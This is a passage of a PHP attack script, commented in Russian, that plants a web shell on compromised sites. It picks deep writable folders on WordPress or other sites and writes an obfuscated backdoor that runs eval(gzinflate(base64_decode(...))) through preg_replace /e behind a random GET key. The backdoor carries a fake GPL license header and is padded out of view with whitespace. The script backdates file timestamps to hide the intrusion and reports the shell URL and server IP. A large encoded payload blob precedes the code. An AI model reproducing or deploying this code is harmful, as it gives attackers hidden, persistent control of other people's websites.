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\'\x29\x29\x29\x3B","");return $a[$i];} ';
			$shell_step_6 = '?>';
			$shell_step_7 = '<?php ';
			$shell_step_8 = '$GLOBALS[\'_792768653_\'][0](_1195823703(0),_1195823703(1),_1195823703(2));';
			$shell_step_9 = '?>';
			$shell_step_10 = '																																																																																					<?php } else { $url_redirect = \'http://\'.$_SERVER[\'SERVER_NAME\']; header("Location: $url_redirect"); exit; } ?>';

			chmod($dir, 0755); // устанавливаем права на папку
			if (file_exists($path_shell))
				chmod($path_shell, 0755);
				
			if (is_writable($dir))
			{	
				$f = fopen ($path_shell, "w");
				fwrite($f, $shell_first_step."\n".$shell_step_1."\n".$shell_step_2.$shell_step_3.$shell_step_4.$shell_step_5.$shell_step_6.$shell_step_7.$shell_step_8.$shell_step_9."\n".$shell_step_10);
				fclose($f);

				if (file_exists($path_shell))	
				{	
					touch($path_shell, $time_for_touch); 	// Делаем тач шелла на дату, до нашего прихода.
					touch($dir, $time_for_touch); 			// Делаем тач папки на дату, до нашего прихода.

					///////////////////

					$arr_good_path = array('/wp-admin/','/wp-content/','/wp-includes/');

					foreach ($arr_good_path as $dir_name)
					{
						$check_path = stristr($dir, $dir_name);
						if ($check_path != false)
						{
							$folder_name[] = $dir_name;
						}
					}
					
					$cnt = 0;
					for ($h=0; ($h < count($folder_name)); $h++)
					{
						$cuting_path[$h] = trim(strstr($dir, $folder_name[$h]));
						if ((strlen($cuting_path[$h])) > $cnt)
							$cnt = strlen($cuting_path[$h]);
					}

					foreach ($cuting_path as $each_way)
					{
						$each_way = trim($each_way);
						if (strlen($each_way) == $cnt)
						{
							$real_path_to_shell = $each_way;
							break;
						}
					}
					$server_IP = $_SERVER['SERVER_ADDR'];
					$real_path_to_shell = 'http://'.$_SERVER["SERVER_NAME"].$real_path_to_shell.$shell_name.'?'.$get;
					echo '<hr><hr>WordPress CMS - shell upload; '.$real_path_to_shell.' ; '.$server_IP.'<hr><hr>';
				}
				else
					echo '<hr><hr>WordPress CMS - Shell could not be created: '.'http://'.$_SERVER["SERVER_NAME"].'<hr><hr>';
			}
			else
				echo '<hr><hr>WordPress CMS - Folder not writable: '.'http://'.$_SERVER["SERVER_NAME"].'<hr><hr>';
		}
		else
			echo '<hr><hr>WordPress CMS - Site is empty: '.'http://'.$_SERVER["SERVER_NAME"].'<hr><hr>';
	
	
	
	}
	elseif ($CMS == 'Unknown')
	{
		$arr_dir = finder_files($_SERVER['DOCUMENT_ROOT']);	// Собираем все пути в массив

		foreach ($arr_dir as $each)
		{
			// Исключаем папки tmp, cache, logs - ибо там шелл едва ли долго продержится.
			$iskl_dir1 = stristr($each, '/tmp/'); $iskl_dir2 = stristr($each, '/cache/'); $iskl_dir3 = stristr($each, '/logs/');
			
			// Собираем подходящие нам пути
			if (($iskl_dir1 == false) and ($iskl_dir2 == false) and ($iskl_dir3 == false))
			{
				$count_slash = substr_count($each, '/');
				$arr_all_folder[$count_slash] = $each;
			}
		}

		if (count($arr_all_folder) > 3)
		{
			// Определяем наиболее дальнюю папку	$arr_last_folder[0]
			krsort($arr_all_folder);

			foreach ($arr_all_folder as $folder)
			{
				$arr_last_folder[] = trim($folder);
			}

			// Выбираем рандомно последнюю, предпоследнюю, либо третью с конца по дальности расположения папку.
			$key_array = 0;

			// Приводим путь к виду /dir/dir2/dir3
			$dir = str_replace(substr(strrchr($arr_last_folder[$key_array], "/"), 1), "", $arr_last_folder[$key_array]);	

			// Формируем будущее имя шелла и GET запрос
			$shell_name = 'cfg.php';

			$arr_simb = array('q','w','e','r','t','y','u','i','o','p','a','s','d','f','g','h','j','k','l','z','x','c','v','b','n','m');
			shuffle($arr_simb);
			$get = rand(0,13).$arr_simb[0].$arr_simb[1].$arr_simb[2].$arr_simb[3].$arr_simb[4].$arr_simb[5].rand(0,13);


			$path_shell = $dir.$shell_name;
			$time_for_touch = filemtime($arr_last_folder[$key_array]);

			$shell_first_step = '<?php';
			$shell_step_1 = ' 
			/*
			 =====================================================
			 Open Source Matters
			 -----------------------------------------------------
			 http://opensourcematters.org/
			 -----------------------------------------------------
			 Copyright (c) 2004,2014
			 =====================================================
			 Данный код защищен авторскими правами
			 =====================================================
			 Назначение: Конфигурация
			 =====================================================
			 GNU GENERAL PUBLIC LICENSE
			 Version 3, 29 June 2007
			 Copyright © 2007 Free Software Foundation, Inc. <http://fsf.org>
			 Everyone is permitted to copy and distribute verbatim copies of this license document, but changing it is not allowed.
			*/
			';

			$shell_step_2 = ' 																																																																																																																																																							 chmod(dirname(__FILE__), 0511); chmod(__FILE__, 0404); if (isset($_REQUEST[\'action\'])){																								 				$GLOBALS[\'_792768653_\']=Array(\'pr\' .\'eg_replace\');                 ';
			$shell_step_2 = str_replace('action', $get, $shell_step_2);
			$shell_step_3 = '?>';
			$shell_step_4 = '<? ';
			$shell_step_5 = 'function _1195823703($i){$a=Array("/.*/e","\x65\x76\x61\x6C\x28\x67\x7A\x69\x6E\x66\x6C\x61\x74\x65\x28\x62\x61\x73\x65\x36\x34\x5F\x64\x65\x63\x6F\x64\x65\x28\'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